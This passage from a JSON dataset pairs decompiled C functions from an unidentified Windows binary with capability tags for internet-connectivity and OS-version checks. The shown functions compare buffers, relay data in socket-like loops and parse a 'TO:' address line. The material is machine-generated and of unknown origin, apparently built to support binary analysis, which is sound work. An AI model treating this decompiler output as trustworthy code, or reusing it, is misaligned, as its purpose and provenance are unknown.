0) {\n            if (var_4ch == 1) goto code_r0x000491d5;\n            var_58h = *(var_54h + 1) - *(var_50h + 1);\n            if (var_58h == 0) {\n                if (var_4ch == 2) goto code_r0x000491d5;\n                var_58h = *(var_54h + 2) - *(var_50h + 2);\n                if (var_58h == 0) {\n                    if ((var_4ch == 3) || (var_58h = *(var_54h + 3) - *(var_50h + 3),  var_58h == 0))\n                    goto code_r0x000491d5;\n                }\n            }\n        }\n        var_5ch = 1;\n        if (var_58h < 1) {\n            var_5ch = -1;\n        }\n    }\n    if (var_5ch != 0) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 1980
    },
    "00049220": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00049220(int32_t arg_8h)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    uint var_698h;\n    uint var_690h;\n    char *var_68ch;\n    uint var_688h;\n    int32_t var_608h;\n    int32_t var_604h;\n    uint var_600h;\n    uint var_5fch;\n    uint var_5f8h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_608h = arg_8h;\n    var_600h = 0;\n    var_5fch = 0;\n    var_8h = 0;\n    var_68ch = 0xb1c5a628;\n    pcVar1 = var_68ch;\n    do {\n        var_68ch = pcVar1;\n        pcVar1 = var_68ch + 1;\n    } while (*var_68ch != '\\0');\n    var_604h = fcn.00075a40(&var_4h, 0xb1c57d20, 0, 0, 0xb1c5a628, var_68ch + 0x4e3a59d9, 2);\n    if (var_604h == 0) {\n        fcn.00078790(&var_688h, 0, 0x80);\n        fcn.00020a20(&var_688h, 0x7f, 0xb1be2374, *(var_608h + 0x20));\n        var_604h = fcn.00076270(var_4h, &var_688h, 0);\n        if ((var_604h == 0) && (var_604h = fcn.000760f0(var_4h, 0),  var_604h == 0)) {\n            var_10h = var_4h;\n            var_ch = *(var_608h + 0x10);\n            var_8h = *(var_608h + 0x14);\n            var_604h = fcn.0001a8e0(&var_600h, 0xb1c164d0, &var_10h);\n            if (var_604h == 0) {\n                if (*(var_608h + 0x610) == 0) goto code_r0x000493fe;\n                var_604h = fcn.00076330(var_4h, var_608h + 0x34, *(var_608h + 0x610), 0);\n                while (var_604h == 0) {\ncode_r0x000493fe:\n                    var_604h = fcn.00052a90(*(var_608h + 0x10), *(var_608h + 0x14), &var_5f8h, 0x5dc, &var_14h, 60000);\n                    if (var_604h != 0) break;\n                    var_604h = fcn.00076330(var_4h, &var_5f8h, var_14h, 0);\n                }\n            }\n        }\n    }\n    fcn.00075d60(&var_4h, 0);\n    iVar2 = fcn.00037240(&var_600h);\n    if (iVar2 == 0) {\n        if (var_8h != 0) {\n            fcn.000529b0(*(var_608h + 0x10), *(var_608h + 0x14));\n        }\n    }\n    else {\n        fcn.00037270(&var_600h, 0);\n        fcn.00037220(&var_600h);\n    }\n    fcn.00052b30(var_608h);\n    return 0;\n}\n",
        "token_count": 878
    },
    "000494d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.000494d0(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    var_4h = arg_8h;\n    do {\n        iVar1 = fcn.000763f0(*var_4h, &var_ch, &var_8h, 0xffffffff, 0);\n        if (iVar1 != 0) {\ncode_r0x00049544:\n            if (var_4h[2] != 0) {\n                fcn.000529b0(var_4h[1], var_4h[2]);\n                var_4h[2] = 0;\n            }\n            return 0;\n        }\n        iVar1 = fcn.00052a50(var_4h[1], var_4h[2], var_ch, var_8h);\n        if (iVar1 != 0) {\n            fcn.00076610(*var_4h, var_ch);\n            goto code_r0x00049544;\n        }\n        fcn.00076610(*var_4h, var_ch);\n    } while( true );\n}\n",
        "token_count": 302
    },
    "00049580": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00049580(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    if (arg_10h == 0) {\n        iVar1 = fcn.0004a080(arg_8h, arg_ch);\n        if (iVar1 != 0) {\n            return 9;\n        }\n    }\n    else {\n        iVar1 = fcn.00049620(arg_8h, arg_ch);\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n        iVar1 = fcn.00049670(arg_8h, arg_ch);\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n        iVar1 = fcn.00046f70(arg_8h, arg_ch);\n        if (iVar1 != 0) {\n            return 5;\n        }\n        iVar1 = fcn.00048e20(arg_8h, arg_ch);\n        if (iVar1 != 0) {\n            return 0xb;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 250
    },
    "00049670": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00049670(int32_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    uint var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t *var_30h;\n    int32_t *var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t *var_18h;\n    int32_t *var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint8_t var_6h;\n    uint8_t *var_4h;\n    \n    if (arg_ch < 0x1f) {\n        return 0;\n    }\n    var_14h = 0xb1be2364;\n    var_18h = arg_8h;\n    for (var_10h = 5; 3 < var_10h; var_10h = var_10h - 4) {\n        if (*var_18h != *var_14h) goto code_r0x000496bf;\n        var_14h = var_14h + 1;\n        var_18h = var_18h + 1;\n    }\n    if (var_10h == 0) {\ncode_r0x00049741:\n        var_20h = 0;\n    }\n    else {\ncode_r0x000496bf:\n        var_1ch = *var_18h - *var_14h;\n        if (var_1ch == 0) {\n            if (var_10h == 1) goto code_r0x00049741;\n            var_1ch = *(var_18h + 1) - *(var_14h + 1);\n            if (var_1ch == 0) {\n                if (var_10h == 2) goto code_r0x00049741;\n                var_1ch = *(var_18h + 2) - *(var_14h + 2);\n                if (var_1ch == 0) {\n                    if ((var_10h == 3) || (var_1ch = *(var_18h + 3) - *(var_14h + 3),  var_1ch == 0))\n                    goto code_r0x00049741;\n                }\n            }\n        }\n        var_20h = 1;\n        if (var_1ch < 1) {\n            var_20h = -1;\n        }\n    }\n    if (var_20h != 0) {\n        return 0;\n    }\n    puVar2 = fcn.000786fa(arg_8h + 5, 0x3f, arg_ch - 0x18);\n    if (puVar2 == NULL) {\n        return 0;\n    }\n    if (puVar2[0xb] != 0x26) {\n        return 0;\n    }\n    uVar1 = puVar2[0xc];\n    var_6h = 0;\n    for (var_ch = 0; var_4h = puVar2 + 1,  var_ch < 8; var_ch = var_ch + 1) {\n        var_6h = var_6h + *var_4h;\n        puVar2 = var_4h;\n    }\n    if (*var_4h != var_6h / 0x1a + 0x41) {\n        return 0;\n    }\n    if (puVar2[2] != 0x7a - var_6h % 0x1a) {\n        return 0;\n    }\n    iVar3 = fcn.000786fa(puVar2 + 4, 0x20, arg_ch - 0x17);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    var_2ch = 0xb1be21b8;\n    var_30h = iVar3 + 1;\n    for (var_28h = 5; 3 < var_28h; var_28h = var_28h - 4) {\n        if (*var_30h != *var_2ch) goto code_r0x00049896;\n        var_2ch = var_2ch + 1;\n        var_30h = var_30h + 1;\n    }\n    if (var_28h == 0) {\ncode_r0x00049918:\n        var_38h = 0;\n    }\n    else {\ncode_r0x00049896:\n        var_34h = *var_30h - *var_2ch;\n        if (var_34h == 0) {\n            if (var_28h == 1) goto code_r0x00049918;\n            var_34h = *(var_30h + 1) - *(var_2ch + 1);\n            if (var_34h == 0) {\n                if (var_28h == 2) goto code_r0x00049918;\n                var_34h = *(var_30h + 2) - *(var_2ch + 2);\n                if (var_34h == 0) {\n                    if ((var_28h == 3) || (var_34h = *(var_30h + 3) - *(var_2ch + 3),  var_34h == 0))\n                    goto code_r0x00049918;\n                }\n            }\n        }\n        var_38h = 1;\n        if (var_34h < 1) {\n            var_38h = -1;\n        }\n    }\n    if (var_38h != 0) {\n        return 0;\n    }\n    return 7 - (uVar1 != 0x61);\n}\n",
        "token_count": 1326
    },
    "00049990": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00049990(int32_t arg_8h)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    uint var_174h;\n    uint var_16ch;\n    uint *var_168h;\n    uint *var_160h;\n    uint var_15ch;\n    uint var_158h;\n    uint var_150h;\n    uint *var_14ch;\n    uint var_148h;\n    int32_t var_c8h;\n    int32_t var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    int32_t var_ach;\n    uint var_a8h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_c8h = arg_8h;\n    var_bch = 0;\n    var_b8h = 0;\n    var_ach = 0;\n    fcn.0002bdc0(&var_a8h, 0x73);\n    if (*(var_c8h + 0x18) != 1) {\n        var_24h = 0;\n        var_20h = 0;\n        var_1ch = 0;\n        var_18h = 0;\n        var_14h = 0;\n        var_10h = 0;\n        var_ch = 0;\n        var_8h = 0;\n        var_4h._0_1_ = 0;\n        fcn.00020a20(&var_24h, 0x20, 0xb1be239c, *(var_c8h + 0x18) + -1);\n        var_14ch = &var_24h;\n        do {\n            cVar2 = *var_14ch;\n            var_14ch = var_14ch + 1;\n        } while (cVar2 != '\\0');\n        uVar3 = var_14ch - &var_24h;\n        var_160h = &var_ach + 3;\n        do {\n            pcVar1 = var_160h + 1;\n            var_160h = var_160h + 1;\n        } while (*pcVar1 != '\\0');\n        puVar6 = &var_24h;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *var_160h = *puVar6;\n            puVar6 = puVar6 + 1;\n            var_160h = var_160h + 1;\n        }\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *var_160h = *puVar6;\n            puVar6 = puVar6 + 1;\n            var_160h = var_160h + 1;\n        }\n    }\n    var_168h = &var_a8h;\n    do {\n        cVar2 = *var_168h;\n        var_168h = var_168h + 1;\n    } while (cVar2 != '\\0');\n    var_c4h = fcn.00075a40(&var_2ch, 0xb1c57d18, 0, 0, &var_a8h, var_168h + (1 - (&var_a8h + 1)), 2);\n    if (var_c4h == 0) {\n        fcn.00078790(&var_148h, 0, 0x80);\n        fcn.00020a20(&var_148h, 0x7f, 0xb1be23a0, *(var_c8h + 0x20));\n        var_c4h = fcn.00076270(var_2ch, &var_148h, 0);\n        if ((var_c4h == 0) && (var_c4h = fcn.000760f0(var_2ch, 0),  var_c4h == 0)) {\n            var_b4h = var_2ch;\n            var_b0h = *(var_c8h + 0x10);\n            var_ach = *(var_c8h + 0x14);\n            var_c4h = fcn.0001a8e0(&var_bch, 0xb1c16e10, &var_b4h);\n            if (var_c4h == 0) {\n                if (*(var_c8h + 0x1c) != 0) {\n                    var_28h = fcn.00035200(*(var_c8h + 0x1c));\n                    if (var_28h == 0) goto code_r0x00049d9c;\n                    var_c4h = fcn.00049f10(*(var_c8h + 0x10), *(var_c8h + 0x14), var_28h, *(var_c8h + 0x1c), 300000);\n                    fcn.00035330(var_28h);\n                    if (var_c4h != 0) goto code_r0x00049d9c;\n                }\n                do {\n                    var_c4h = fcn.00049f10(*(var_c8h + 0x10), *(var_c8h + 0x14), &var_c0h, 4, 300000);\n                    if (var_c4h != 0) break;\n                    var_c0h = fcn.00035490(var_c0h);\n                    var_28h = fcn.00035200(var_c0h);\n                    if (var_28h == 0) break;\n                    var_c4h = fcn.00049f10(*(var_c8h + 0x10), *(var_c8h + 0x14), var_28h, var_c0h, 300000);\n                    if (var_c4h != 0) {\n                        fcn.00035330(var_28h);\n                        break;\n                    }\n                    var_c4h = fcn.00076330(var_2ch, var_28h, var_c0h, 0);\n                    fcn.00035330(var_28h);\n                } while (var_c4h == 0);\n            }\n        }\n    }\ncode_r0x00049d9c:\n    fcn.00075d60(&var_2ch, 0);\n    iVar4 = fcn.00037240(&var_bch);\n    if (iVar4 == 0) {\n        if (var_ach != 0) {\n            fcn.000529b0(*(var_c8h + 0x10), *(var_c8h + 0x14));\n        }\n    }\n    else {\n        fcn.00037270(&var_bch, 0);\n        fcn.00037220(&var_bch);\n    }\n    fcn.00052b30(var_c8h);\n    return 0;\n}\n",
        "token_count": 1662
    },
    "00049e10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00049e10(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_10h;\n    uint var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    var_8h = arg_8h;\n    do {\n        iVar1 = fcn.000763f0(*var_8h, &var_4h, &var_ch, 0xffffffff, 0);\n        if (iVar1 != 0) {\ncode_r0x00049ed5:\n            if (var_8h[2] != 0) {\n                fcn.000529b0(var_8h[1], var_8h[2]);\n                var_8h[2] = 0;\n            }\n            return 0;\n        }\n        var_ch = fcn.00035490(var_ch);\n        iVar1 = fcn.00052a50(var_8h[1], var_8h[2], &var_ch, 4);\n        if (iVar1 != 0) {\n            fcn.00076610(*var_8h, var_4h);\n            goto code_r0x00049ed5;\n        }\n        var_ch = fcn.00035490(var_ch);\n        iVar1 = fcn.00052a50(var_8h[1], var_8h[2], var_4h, var_ch);\n        if (iVar1 != 0) {\n            fcn.00076610(*var_8h, var_4h);\n            goto code_r0x00049ed5;\n        }\n        fcn.00076610(*var_8h, var_4h);\n    } while( true );\n}\n",
        "token_count": 407
    },
    "00049f10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __cdecl fcn.00049f10(uint arg_8h, uint arg_ch, int32_t arg_10h, uint32_t arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    for (var_8h = 0; var_8h < arg_14h; var_8h = var_8h + var_4h) {\n        iVar1 = fcn.00052a90(arg_8h, arg_ch, arg_10h + var_8h, arg_14h - var_8h, &var_4h, arg_18h);\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n        if (var_4h == 0) break;\n    }\n    if (var_8h == arg_14h) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 283
    },
    "00049f80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x0004a013)\n// WARNING: Removing unreachable block (ram,0x0004a02a)\n// WARNING: Removing unreachable block (ram,0x0004a033)\n// WARNING: Switch with 1 destination removed at 0x00049fd2\n\nvoid __cdecl fcn.00049f80(int32_t arg_8h)\n\n{\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    fcn.00052ae0(*(arg_8h + 0x28), *(arg_8h + 0x2c), *(arg_8h + 0x30));\n    *(arg_8h + 0x1c) = 0;\n    if (*(arg_8h + 0x18) - 1U < 0xb) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    fcn.00052b10(*(arg_8h + 0x10), *(arg_8h + 0x14));\n    fcn.00035330(arg_8h);\n    return;\n}\n",
        "token_count": 273
    },
    "0004a080": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0004a080(int32_t *arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    uint8_t *arg_8h_00;\n    uint var_50h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t *var_44h;\n    int32_t *var_40h;\n    uint32_t var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t *var_2ch;\n    int32_t *var_28h;\n    uint32_t var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    if (arg_ch < 0xd) {\n        return 0;\n    }\n    var_10h = 0xb1be23d8;\n    var_14h = arg_8h;\n    for (var_ch = 5; 3 < var_ch; var_ch = var_ch - 4) {\n        if (*var_14h != *var_10h) goto code_r0x0004a0d1;\n        var_10h = var_10h + 1;\n        var_14h = var_14h + 1;\n    }\n    if (var_ch == 0) {\ncode_r0x0004a153:\n        var_1ch = 0;\n    }\n    else {\ncode_r0x0004a0d1:\n        var_18h = *var_14h - *var_10h;\n        if (var_18h == 0) {\n            if (var_ch == 1) goto code_r0x0004a153;\n            var_18h = *(var_14h + 1) - *(var_10h + 1);\n            if (var_18h == 0) {\n                if (var_ch == 2) goto code_r0x0004a153;\n                var_18h = *(var_14h + 2) - *(var_10h + 2);\n                if (var_18h == 0) {\n                    if ((var_ch == 3) || (var_18h = *(var_14h + 3) - *(var_10h + 3),  var_18h == 0))\n                    goto code_r0x0004a153;\n                }\n            }\n        }\n        var_1ch = 1;\n        if (var_18h < 1) {\n            var_1ch = -1;\n        }\n    }\n    if (var_1ch == 0) goto code_r0x0004a3b2;\n    var_28h = 0xb1be23e0;\n    var_2ch = arg_8h;\n    for (var_24h = 5; 3 < var_24h; var_24h = var_24h - 4) {\n        if (*var_2ch != *var_28h) goto code_r0x0004a1be;\n        var_28h = var_28h + 1;\n        var_2ch = var_2ch + 1;\n    }\n    if (var_24h == 0) {\ncode_r0x0004a240:\n        var_34h = 0;\n    }\n    else {\ncode_r0x0004a1be:\n        var_30h = *var_2ch - *var_28h;\n        if (var_30h == 0) {\n            if (var_24h == 1) goto code_r0x0004a240;\n            var_30h = *(var_2ch + 1) - *(var_28h + 1);\n            if (var_30h == 0) {\n                if (var_24h == 2) goto code_r0x0004a240;\n                var_30h = *(var_2ch + 2) - *(var_28h + 2);\n                if (var_30h == 0) {\n                    if ((var_24h == 3) || (var_30h = *(var_2ch + 3) - *(var_28h + 3),  var_30h == 0))\n                    goto code_r0x0004a240;\n                }\n            }\n        }\n        var_34h = 1;\n        if (var_30h < 1) {\n            var_34h = -1;\n        }\n    }\n    if (var_34h != 0) {\n        return 0;\n    }\n    iVar1 = fcn.000786fa(arg_8h, 10, arg_ch);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    piVar3 = iVar1 + 1;\n    arg_ch = arg_ch - (piVar3 - arg_8h);\n    if (arg_ch < 0xd) {\n        return 0;\n    }\n    var_40h = 0xb1be23d8;\n    var_44h = piVar3;\n    for (var_3ch = 5; 3 < var_3ch; var_3ch = var_3ch - 4) {\n        if (*var_44h != *var_40h) goto code_r0x0004a2f7;\n        var_40h = var_40h + 1;\n        var_44h = var_44h + 1;\n    }\n    if (var_3ch == 0) {\ncode_r0x0004a379:\n        var_4ch = 0;\n    }\n    else {\ncode_r0x0004a2f7:\n        var_48h = *var_44h - *var_40h;\n        if (var_48h == 0) {\n            if (var_3ch == 1) goto code_r0x0004a379;\n            var_48h = *(var_44h + 1) - *(var_40h + 1);\n            if (var_48h == 0) {\n                if (var_3ch == 2) goto code_r0x0004a379;\n                var_48h = *(var_44h + 2) - *(var_40h + 2);\n                if (var_48h == 0) {\n                    if ((var_3ch == 3) || (var_48h = *(var_44h + 3) - *(var_40h + 3),  var_48h == 0))\n                    goto code_r0x0004a379;\n                }\n            }\n        }\n        var_4ch = 1;\n        if (var_48h < 1) {\n            var_4ch = -1;\n        }\n    }\n    arg_8h = piVar3;\n    if (var_4ch != 0) {\n        return 0;\n    }\ncode_r0x0004a3b2:\n    iVar1 = fcn.00035fe0(*(arg_8h + 5));\n    if (((iVar1 == 0x54) && (iVar1 = fcn.00035fe0(*(arg_8h + 6)),  iVar1 == 0x4f)) && (*(arg_8h + 7) == 0x3a)) {\n        var_4h = arg_8h + 2;\n        for (arg_ch = arg_ch - 8; (*var_4h == 0x20 && (arg_ch != 0)); arg_ch = arg_ch - 1) {\n            var_4h = var_4h + 1;\n        }\n        if (arg_ch < 4) {\n            uVar2 = 0;\n        }\n        else if (*var_4h == 0x3c) {\n            arg_8h_00 = var_4h + 1;\n            iVar1 = fcn.000786fa(arg_8h_00, 0x40, arg_ch - 1);\n            if (iVar1 == 0) {\n                uVar2 = 0;\n            }\n            else if (iVar1 - arg_8h_00 == 10) {\n                uVar2 = fcn.00037990(arg_8h_00);\n            }\n            else {\n                uVar2 = 0;\n            }\n        }\n        else {\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 1954
    },
    "0004a490": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0004a490(int32_t arg_8h)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    uint *puVar8;\n    bool bVar9;\n    uint var_2c0h;\n    uint var_2b8h;\n    uint *var_2b4h;\n    uint var_2b0h;\n    uint var_2a8h;\n    uint *var_2a4h;\n    uint var_2a0h;\n    int32_t var_29ch;\n    uint *var_294h;\n    uint8_t *var_290h;\n    uint var_28ch;\n    uint var_284h;\n    uint *var_280h;\n    uint var_27ch;\n    uint var_274h;\n    char *var_270h;\n    uint var_26ch;\n    uint var_264h;\n    uint *var_260h;\n    int32_t var_25ch;\n    uint var_258h;\n    uint var_250h;\n    uint *var_24ch;\n    uint var_248h;\n    int32_t var_244h;\n    uint8_t *var_23ch;\n    uint8_t *var_238h;\n    uint var_234h;\n    uint var_22ch;\n    uint *var_228h;\n    uint *var_220h;\n    uint var_21ch;\n    uint var_218h;\n    uint var_210h;\n    uint *var_20ch;\n    uint var_208h;\n    uint var_200h;\n    uint *var_1fch;\n    uint var_1f8h;\n    uint var_1f0h;\n    char *var_1ech;\n    uint var_1e8h;\n    int32_t var_1e4h;\n    uint *var_1dch;\n    uint8_t *var_1d8h;\n    uint var_1d4h;\n    int32_t var_1d0h;\n    uint *var_1c8h;\n    uint8_t *var_1c4h;\n    uint var_1c0h;\n    uint var_1b8h;\n    uint *var_1b4h;\n    uint var_1b0h;\n    int32_t var_1ach;\n    uint *var_1a4h;\n    uint8_t *var_1a0h;\n    uint var_19ch;\n    uint var_194h;\n    uint *var_190h;\n    uint var_18ch;\n    uint var_184h;\n    uint *var_180h;\n    uint var_17ch;\n    int32_t var_178h;\n    int32_t var_174h;\n    int32_t *var_170h;\n    int32_t *var_16ch;\n    uint32_t var_168h;\n    uint var_164h;\n    uint var_15ch;\n    uint *var_158h;\n    uint var_154h;\n    int32_t var_150h;\n    int32_t var_14ch;\n    int32_t *var_148h;\n    int32_t *var_144h;\n    uint32_t var_140h;\n    uint var_13ch;\n    int32_t var_124h;\n    int32_t var_120h;\n    int32_t var_11ch;\n    uint var_118h;\n    uint var_113h;\n    uint32_t var_98h;\n    int32_t var_94h;\n    uint32_t var_90h;\n    char *var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint32_t var_80h;\n    uint var_7ch;\n    uint *var_8h;\n    uint8_t *var_4h;\n    \n    var_120h = arg_8h;\n    var_8ch = NULL;\n    fcn.0007865e(&var_13ch, 0xb1be21c8, *(arg_8h + 0x20), *(arg_8h + 0x21), *(arg_8h + 0x22), *(arg_8h + 0x23), \n                 *(arg_8h + 0x24));\n    var_8h = fcn.00035200(0xbd0);\n    if (var_8h == NULL) goto code_r0x0004b4c1;\n    fcn.00078790(var_8h, 0, 0xbd0);\n    *var_8h = *(var_120h + 0x10);\n    var_8h[1] = *(var_120h + 0x14);\n    if (3000 < *(var_120h + 0x610)) goto code_r0x0004b4c1;\n    var_8h[3] = 0;\n    var_8h[2] = *(var_120h + 0x610) % 3000;\n    var_8h[4] = *(var_120h + 0x610);\n    fcn.0007877e(var_8h + 5, var_120h + 0x34, *(var_120h + 0x610));\n    var_8ch = fcn.00035200(0x2000);\n    if ((var_8ch == NULL) || (iVar4 = fcn.0004b510(var_8h, &var_118h, 0x80),  iVar4 == 0)) goto code_r0x0004b4c1;\n    var_144h = 0xb1be23e0;\n    var_148h = &var_118h;\n    for (var_140h = 5; 3 < var_140h; var_140h = var_140h - 4) {\n        if (*var_148h != *var_144h) goto code_r0x0004a656;\n        var_144h = var_144h + 1;\n        var_148h = var_148h + 1;\n    }\n    if (var_140h == 0) {\ncode_r0x0004a72c:\n        var_150h = 0;\n    }\n    else {\ncode_r0x0004a656:\n        var_14ch = *var_148h - *var_144h;\n        if (var_14ch == 0) {\n            if (var_140h == 1) goto code_r0x0004a72c;\n            var_14ch = *(var_148h + 1) - *(var_144h + 1);\n            if (var_14ch == 0) {\n                if (var_140h == 2) goto code_r0x0004a72c;\n                var_14ch = *(var_148h + 2) - *(var_144h + 2);\n                if (var_14ch == 0) {\n                    if ((var_140h == 3) || (var_14ch = *(var_148h + 3) - *(var_144h + 3),  var_14ch == 0))\n                    goto code_r0x0004a72c;\n                }\n            }\n        }\n        var_150h = 1;\n        if (var_14ch < 1) {\n            var_150h = -1;\n        }\n    }\n    if (var_150h == 0) {\n        var_88h = *0xb1be23e8;\n        var_84h = *0xb1be23ec;\n        var_80h = *0xb1be23f0;\n        var_7ch = *0xb1be23f4;\n        var_158h = &var_88h;\n        do {\n            cVar2 = *var_158h;\n            var_158h = var_158h + 1;\n        } while (cVar2 != '\\0');\n        fcn.00052a50(*var_8h, var_8h[1], &var_88h, var_158h - (&var_88h + 1));\n        iVar4 = fcn.0004b510(var_8h, &var_118h, 0x80);\n        if (iVar4 == 0) goto code_r0x0004b4c1;\n    }\n    var_16ch = 0xb1be23d8;\n    var_170h = &var_118h;\n    for (var_168h = 5; 3 < var_168h; var_168h = var_168h - 4) {\n        if (*var_170h != *var_16ch) goto code_r0x0004a87f;\n        var_16ch = var_16ch + 1;\n        var_170h = var_170h + 1;\n    }\n    if (var_168h == 0) {\ncode_r0x0004a955:\n        var_178h = 0;\n    }\n    else {\ncode_r0x0004a87f:\n        var_174h = *var_170h - *var_16ch;\n        if (var_174h == 0) {\n            if (var_168h == 1) goto code_r0x0004a955;\n            var_174h = *(var_170h + 1) - *(var_16ch + 1);\n            if (var_174h == 0) {\n                if (var_168h == 2) goto code_r0x0004a955;\n                var_174h = *(var_170h + 2) - *(var_16ch + 2);\n                if (var_174h == 0) {\n                    if ((var_168h == 3) || (var_174h = *(var_170h + 3) - *(var_16ch + 3),  var_174h == 0))\n                    goto code_r0x0004a955;\n                }\n            }\n        }\n        var_178h = 1;\n        if (var_174h < 1) {\n            var_178h = -1;\n        }\n    }\n    if (var_178h == 0) {\n        var_88h = *0xb1be2418;\n        var_84h = *0xb1be241c;\n        var_80h = var_80h & 0xffffff00 | *0xb1be2420;\n        var_190h = &var_88h;\n        do 